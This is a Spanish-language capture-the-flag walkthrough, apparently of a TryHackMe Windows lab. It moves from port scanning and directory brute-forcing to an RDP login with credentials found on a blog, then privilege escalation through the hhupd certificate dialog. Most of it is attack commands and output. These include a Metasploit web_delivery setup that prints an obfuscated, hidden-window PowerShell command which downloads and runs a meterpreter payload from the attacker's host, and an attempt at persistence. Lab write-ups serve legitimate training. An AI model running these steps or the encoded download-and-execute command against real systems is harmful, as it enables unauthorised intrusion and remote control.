## Objetivo
## Pistas
## Solución

```
1/////

──(kali㉿kali)-[~]
└─$ nmap -Pn -sV --min-rate 5000 10.10.151.216 -v -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 18:30 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 18:30
Completed Parallel DNS resolution of 1 host. at 18:30, 0.04s elapsed
Initiating Connect Scan at 18:30
Scanning 10.10.151.216 [65535 ports]
Discovered open port 80/tcp on 10.10.151.216
Discovered open port 3389/tcp on 10.10.151.216
Completed Connect Scan at 18:30, 37.17s elapsed (65535 total ports)
Initiating Service scan at 18:30
Scanning 2 services on 10.10.151.216
Completed Service scan at 18:30, 7.28s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.151.216.
Initiating NSE at 18:30
Completed NSE at 18:31, 0.86s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.78s elapsed
Nmap scan report for 10.10.151.216
Host is up (0.20s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

2 //// Entramos a la ip en el navegador y suelta el nombre de la pagina

3 ///


┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.151.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50


Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 150] [--> http://10.10.151.216/retro/]

vamos hacia ese directorio

http://10.10.151.216/retro/

/retro/

4/// en la pagina dice by wade

5 // Vamos al post player one
parzival

6 /////
──(kali㉿kali)-[~]
└─$ xfreerdp /u:wade /p:parzival /v:10.10.151.216 /cert:ignore






7/////

Buscamos HHUPD en el buscador normal

8////
hhupd

9///

damos click al programa
luego al certicado
nos abre el navegador
damos ctrl s
ponemos c:\windows\system32\*.exe
buscamos el cmd 
ponemos whoami






10\\\\


──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > use 0
[-] Invalid module index: 0
msf6 exploit(multi/script/web_delivery) > options


msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.9.0.44

11//


msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X


12///

msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > options
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http

msf6 exploit(multi/script/web_delivery) > set srvport 9090
srvport => 9090

msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 1.

powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABkADkAeQBYADIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZAA5AHkAWAAyAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZAA5AHkAWAAyAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADAALgA0ADQAOgA5ADAAOQAwAC8AUgBJAEsAWABOADAAawBlAFYANABLAGMASAAxAEoALwA5AHAAYgBVAGYATgBYADkAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADkALgAwAC4ANAA0ADoAOQAwADkAMAAvAFIASQBLAFgATgAwAGsAZQBWADQASwBjAEgAMQBKACcAKQApADsA

lo anterior lo ponemos en la terminal de la maquina que estamos adentro

////////



meterpreter > run persistence -x

[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[-] The specified meterpreter session script could not be found: persistence
meterpreter > 

```
## Notas adicionales
## Referencias